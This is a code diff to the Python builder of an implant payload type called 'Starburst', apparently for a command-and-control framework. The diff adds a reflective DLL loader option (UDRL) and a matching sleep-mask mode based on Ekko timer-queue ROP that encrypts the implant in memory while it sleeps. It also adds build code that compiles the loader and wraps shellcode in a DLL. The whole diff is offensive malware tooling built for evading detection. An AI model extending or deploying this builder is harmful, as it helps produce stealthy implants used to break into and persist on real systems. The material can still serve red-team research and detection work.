@@ -127,6 +127,17 @@ class Starburst(PayloadType):
             description="Include debug output",
         ),
         BuildParameter(
+            name="loader_type",
+            group_name="UDRL",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["default", "udrl", "custom"],
+            default_value="default",
+            description="Loader type: default (simple VirtualAlloc), udrl (reflective DLL loader), or custom (upload ZIP)",
+            hide_conditions=[
+                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
+            ],
+        ),
+        BuildParameter(
             name="custom_udrl",
             group_name="UDRL",
             parameter_type=BuildParameterType.Boolean,
@@ -135,6 +146,7 @@ class Starburst(PayloadType):
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.NotEQ, value="custom"),
             ],
         ),
         BuildParameter(
@@ -252,9 +264,9 @@ class Starburst(PayloadType):
             name="sleep_mask",
             group_name="Evasion",
             parameter_type=BuildParameterType.ChooseOne,
-            choices=["default", "full_image", "heap", "ekko", "custom"],
+            choices=["default", "full_image", "heap", "ekko", "udrl", "custom"],
             default_value="default",
-            description="Sleep mask type: XOR sensitive fields, full image XOR, heap masking, Ekko timer-queue ROP (x64, encrypts image during sleep), or custom",
+            description="Sleep mask type: XOR sensitive fields, full image XOR, heap masking, Ekko timer-queue ROP (x64), UDRL (Ekko + UDRL user data awareness), or custom",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
             ],
@@ -819,6 +831,7 @@ class Starburst(PayloadType):
             "full_image": "MASK_FULL_IMAGE",
             "heap": "MASK_HEAP",
             "ekko": "MASK_EKKO",
+            "udrl": "MASK_UDRL",
             "custom": "MASK_CUSTOM",
         }
         defines.append(f"#define SLEEP_MASK_TYPE {mask_map.get(mask, 'MASK_DEFAULT')}")
@@ -849,7 +862,16 @@ class Starburst(PayloadType):
             logger.error("Crystal Palace not installed - place crystalpalace.jar in loaders/crystal-palace/crystal-linker/")
             return None
 
-        use_custom = self.get_parameter("custom_udrl")
+        try:
+            loader_type = self.get_parameter("loader_type") or "default"
+        except Exception:
+            loader_type = "default"
+        try:
+            use_custom = self.get_parameter("custom_udrl") and loader_type == "custom"
+        except Exception:
+            use_custom = False
+        use_udrl = loader_type == "udrl"
+
         if use_custom:
             udrl_dir = os.path.join(build_path, "custom_udrl")
             os.makedirs(udrl_dir, exist_ok=True)
@@ -884,6 +906,19 @@ class Starburst(PayloadType):
             if not loader_path:
                 logger.error(f"No loader.spec found in custom UDRL archive")
                 return None
+        elif use_udrl:
+            loader_path = os.path.join(cp_path, "udrl")
+            if not os.path.exists(os.path.join(loader_path, "loader.spec")):
+                logger.error("Built-in UDRL loader not found at loaders/crystal-palace/udrl/")
+                return None
+            make_proc = subprocess.run(
+                ["make", "clean", "all"],
+                cwd=loader_path, env=_make_env(),
+                capture_output=True, text=True, timeout=60)
+            if make_proc.returncode != 0:
+                logger.error(f"UDRL loader compile failed: {make_proc.stderr}")
+                return None
+            logger.info("Built-in UDRL reflective loader compiled successfully")
         else:
             loader_path = os.path.join(cp_path, "default")
 
@@ -894,7 +929,7 @@ class Starburst(PayloadType):
             logger.error(f"loader.spec not found at {spec_file}")
             return None
 
-        if use_custom:
+        if use_custom or use_udrl:
             try:
                 dll_path = await _wrap_shellcode_in_dll(shellcode, arch, build_path)
             except RuntimeError as e:
